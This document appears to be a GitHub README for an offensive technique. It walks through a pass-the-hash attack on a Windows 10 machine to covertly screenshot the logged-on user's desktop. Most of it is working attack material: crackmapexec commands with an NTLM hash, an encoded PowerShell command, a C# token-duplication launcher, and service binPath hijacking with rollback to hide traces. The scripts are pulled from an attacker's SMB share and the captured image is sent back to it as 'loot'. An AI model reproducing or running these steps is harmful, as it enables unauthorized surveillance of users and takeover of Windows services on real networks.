# PS-Screenshot
Technique to hijack SYSTEM service to grab screenshot of logged on user's desktop using token duplication.

This is a pass-the-hash (PTH) procedure for grabbing a screenshot of a remote user's desktop in Windows 10 Pro.  This technique uses crackmap and powershell and assumes that you have already acquired admin credentials (NTLM hash) for the remote computer.

## (Step 1) List services that run as LocalSystem showing status and binPath

The powershell command that will be excuted is:<br />
`Get-WmiObject win32_service | Format-list Name,DisplayName,State,StartMode,StartName,PathName`<br />

Convert this to a powershell base64 utf-16le encoded command:<br />
`echo "Get-WmiObject win32_service | Format-list Name,DisplayName,State,StartMode,StartName,PathName" | iconv -t utf-16le | base64 -w 0; echo`<br />

Use crackmap to list services on the target (192.168.1.242) using the base64 output:<br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'powershell.exe -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAHcAaQBuADMAMgBfAHMAZQByAHYAaQBjAGUAIAB8ACAARgBvAHIAbQBhAHQALQBsAGkAcwB0ACAATgBhAG0AZQAsAEQAaQBzAHAAbABhAHkATgBhAG0AZQAsAFMAdABhAHQAZQAsAFMAdABhAHIAdABNAG8AZABlACwAUwB0AGEAcgB0AE4AYQBtAGUALABQAGEAdABoAE4AYQBtAGUACgA='`<br />

Select a service that is set to manual, is not running and launches as LocalSystem (e.g.):<br />
```
Name        : AppMgmt
DisplayName : Application Management
State       : Stopped
StartMode   : Manual
StartName   : LocalSystem
PathName    : C:\WINDOWS\system32\svchost.exe -k netsvcs -p
```

Not all services running as LocalSystem will work, you may have to experiment to find one that is not restricted (e.g.):<br />
```
Name        : GoogleChromeElevationService
DisplayName : Google Chrome Elevation Service
State       : Stopped
StartMode   : Manual
StartName   : LocalSystem
PathName    : "C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe"
```

## (Step 2) Start your anonymous samba server

The samba server will need to allow anonymous read and write since the exploit scripts will be delivered from it and the PNG screenshot will also be uploaded to it.  In this example the samba server will be the attacking Linux machine (192.168.1.19).  You will need to change references to this address to conform to your environment.

## (Step 3) Create the launcher script under the samba share

In this example the script will be named `launcher.ps1`

```powershell
$C =  @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    using System.Security;

    public class ApplicationLauncher
    {
        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            MaxTokenInfoClass
        }

        public const int READ_CONTROL = 0x00020000;

        public const int STANDARD_RIGHTS_REQUIRED = 0x000F0000;

        public const int STANDARD_RIGHTS_READ = READ_CONTROL;
        public const int STANDARD_RIGHTS_WRITE = READ_CONTROL;
        public const int STANDARD_RIGHTS_EXECUTE = READ_CONTROL;

        public const int STANDARD_RIGHTS_ALL = 0x001F0000;

        public const int SPECIFIC_RIGHTS_ALL = 0x0000FFFF;

        public const int TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const int TOKEN_DUPLICATE = 0x0002;
        public const int TOKEN_IMPERSONATE = 0x0004;
        public const int TOKEN_QUERY = 0x0008;
        public const int TOKEN_QUERY_SOURCE = 0x0010;
        public const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const int TOKEN_ADJUST_GROUPS = 0x0040;
        public const int TOKEN_ADJUST_DEFAULT = 0x0080;
        public const int TOKEN_ADJUST_SESSIONID = 0x0100;

        public const int TOKEN_ALL_ACCESS_P = (STANDARD_RIGHTS_REQUIRED |
                                               TOKEN_ASSIGN_PRIMARY |
                                               TOKEN_DUPLICATE |
                                               TOKEN_IMPERSONATE |
                                               TOKEN_QUERY |
                                               TOKEN_QUERY_SOURCE |
                                               TOKEN_ADJUST_PRIVILEGES |
                                               TOKEN_ADJUST_GROUPS |
                                               TOKEN_ADJUST_DEFAULT);

        public const int TOKEN_ALL_ACCESS = TOKEN_ALL_ACCESS_P | TOKEN_ADJUST_SESSIONID;

        public const int TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;

        public const int TOKEN_WRITE = STANDARD_RIGHTS_WRITE |
                                       TOKEN_ADJUST_PRIVILEGES |
                                       TOKEN_ADJUST_GROUPS |
                                       TOKEN_ADJUST_DEFAULT;

        public const int TOKEN_EXECUTE = STANDARD_RIGHTS_EXECUTE;

        public const uint MAXIMUM_ALLOWED = 0x2000000;

        public const int CREATE_NEW_PROCESS_GROUP = 0x00000200;
        public const int CREATE_UNICODE_ENVIRONMENT = 0x00000400;

        public const int IDLE_PRIORITY_CLASS = 0x40;
        public const int NORMAL_PRIORITY_CLASS = 0x20;
        public const int HIGH_PRIORITY_CLASS = 0x80;
        public const int REALTIME_PRIORITY_CLASS = 0x100;

        public const int CREATE_NEW_CONSOLE = 0x00000010;
	public const int CREATE_NO_WINDOW = 0x08000000;

        public const string SE_DEBUG_NAME = "SeDebugPrivilege";
        public const string SE_RESTORE_NAME = "SeRestorePrivilege";
        public const string SE_BACKUP_NAME = "SeBackupPrivilege";

        public const int SE_PRIVILEGE_ENABLED = 0x0002;

        public const int ERROR_NOT_ALL_ASSIGNED = 1300;

        private const uint TH32CS_SNAPPROCESS = 0x00000002;

        public static int INVALID_HANDLE_VALUE = -1;

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(IntPtr lpSystemName, string lpname,
            [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);

        [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi,
            CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
            String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DuplicateToken(IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
        public static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType,
            int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
            ref uint TokenInformation, uint TokenInformationLength);

        [DllImport("userenv.dll", SetLastError = true)]
        public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        public static bool CreateProcessInConsoleSession(String CommandLine)
        {

            PROCESS_INFORMATION pi;

            bool bResult = false;
            uint dwSessionId, explorerPid = 0;
            IntPtr hUserTokenDup = IntPtr.Zero, hPToken = IntPtr.Zero, hProcess = IntPtr.Zero;

            // Get the desktop session ID
            dwSessionId = WTSGetActiveConsoleSessionId();

            // Find the explorer process
            var procEntry = new PROCESSENTRY32();

            uint hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if(hSnap == INVALID_HANDLE_VALUE)
            {
                return false;
            }

            procEntry.dwSize = (uint) Marshal.SizeOf(procEntry);

            if(Process32First(hSnap, ref procEntry) == 0)
            {
                return false;
            }

            String strCmp = "explorer.exe";
            do
            {
                if(strCmp.IndexOf(procEntry.szExeFile) == 0)
                {
                    // Check if explorer process is running in the console session
                    uint explorerSessId = 0;
                    if(ProcessIdToSessionId(procEntry.th32ProcessID, ref explorerSessId) && explorerSessId == dwSessionId)
                    {
                        explorerPid = procEntry.th32ProcessID;
                        break;
                    }
                }
            }
            while(Process32Next(hSnap, ref procEntry) != 0);

            if(explorerPid == 0)
            {
                return false;
            }

            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "winsta0\\default";
            var luid = new LUID();
            hProcess = OpenProcess(MAXIMUM_ALLOWED, false, explorerPid);

            if(!OpenProcessToken(hProcess,
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID | TOKEN_READ | TOKEN_WRITE,
                    ref hPToken))
            {
                CloseHandle(hProcess);
                return false;
            }

            if(!LookupPrivilegeValue(IntPtr.Zero, SE_DEBUG_NAME, ref luid))
            {
                CloseHandle(hProcess);
                CloseHandle(hPToken);
                return false;
            }

            var sa = new SECURITY_ATTRIBUTES();
            sa.Length = Marshal.SizeOf(sa);
            if(!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, ref sa,
                    (int) SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, (int) TOKEN_TYPE.TokenPrimary,
                    ref hUserTokenDup))
            {
                CloseHandle(hProcess);
                CloseHandle(hPToken);
                return false;
            }

            // uint dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;
            uint dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW;
            IntPtr pEnv = IntPtr.Zero;
            if(CreateEnvironmentBlock(ref pEnv, hUserTokenDup, true))
            {
                dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
            }
            else
            {
                pEnv = IntPtr.Zero;
            }
            // Launch the process under the user's session
            bResult = CreateProcessAsUser(hUserTokenDup,
                null,
                CommandLine,
                ref sa,
                ref sa,
                false,
                (int) dwCreationFlags,
                pEnv,
                null,
                ref si,
                out pi);

            CloseHandle(hProcess);
            CloseHandle(hUserTokenDup);
            CloseHandle(hPToken);

            return true;
        }

        [DllImport("kernel32.dll")]
        private static extern int Process32First(uint hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern int Process32Next(uint hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hSnapshot);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        [DllImport("kernel32.dll")]
        private static extern bool ProcessIdToSessionId(uint dwProcessId, ref uint pSessionId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("advapi32", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        #region Nested type: LUID

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public int LowPart;
            public int HighPart;
        }

        #endregion

        // end struct

        #region Nested type: LUID_AND_ATRIBUTES

        [StructLayout(LayoutKind.Sequential)]
        internal struct LUID_AND_ATRIBUTES
        {
            public LUID Luid;
            public int Attributes;
        }

        #endregion

        #region Nested type: PROCESSENTRY32

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESSENTRY32
        {
            public uint dwSize;
            public readonly uint cntUsage;
            public readonly uint th32ProcessID;
            public readonly IntPtr th32DefaultHeapID;
            public readonly uint th32ModuleID;
            public readonly uint cntThreads;
            public readonly uint th32ParentProcessID;
            public readonly int pcPriClassBase;
            public readonly uint dwFlags;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public readonly string szExeFile;
        }

        #endregion

        #region Nested type: PROCESS_INFORMATION

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        #endregion

        #region Nested type: SECURITY_ATTRIBUTES

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        #endregion

        #region Nested type: SECURITY_IMPERSONATION_LEVEL

        private enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous = 0,
            SecurityIdentification = 1,
            SecurityImpersonation = 2,
            SecurityDelegation = 3,
        }

        #endregion

        #region Nested type: STARTUPINFO

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        #endregion

        #region Nested type: TOKEN_PRIVILEGES

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            internal int PrivilegeCount;
            // LUID_AND_ATRIBUTES
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            internal int[] Privileges;
        }

        #endregion

        #region Nested type: TOKEN_TYPE

        private enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation = 2
        }

        #endregion

        // handle to open access token
    }
"@

Add-Type -TypeDefinition $C -ReferencedAssemblies mscorlib

[ApplicationLauncher]::CreateProcessInConsoleSession("powershell -ExecutionPolicy Bypass -File \\192.168.1.19\smbdata\screenshot.ps1")
```

## (Step 4) Create the screenshot script under the samba share

In this example the script will be named `screenshot.ps1`

```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$File = "\\192.168.1.19\smbdata\screenshot.png"
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$pngimg = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($pngimg)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $pngimg.Size)
$pngimg.Save($File)
```

## (Step 5) Reconfigure and start the service

The binPath for the service you identified in step 1 will be changed to run your exploit scripts then it will be reverted back to normal.

**(reconfigure the service you chose - both example services shown)**<br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "cmd.exe /c start /min /b powershell -ExecutionPolicy Bypass -File \\192.168.1.19\smbdata\launcher.ps1"'`<br /><br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config GoogleChromeElevationService binPath= "cmd.exe /c start /min /b powershell -ExecutionPolicy Bypass -File \\192.168.1.19\smbdata\launcher.ps1"'`<br /><br />
**(start the service - both example services shown)**<br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc start AppMgmt'`<br /><br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc start GoogleChromeElevationService'`<br /><br />
**(revert the binPath on the service - both example services shown)**<br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "C:\WINDOWS\system32\svchost.exe -k netsvcs -p"'`<br /><br />
`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config GoogleChromeElevationService binPath= "\"C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe\""'`<br />

## (Step 6) Collect your loot
If everything executed properly and your samba share had guest write access enabled then you should see a PNG graphic file named `screenshot.png` in the upload directory.
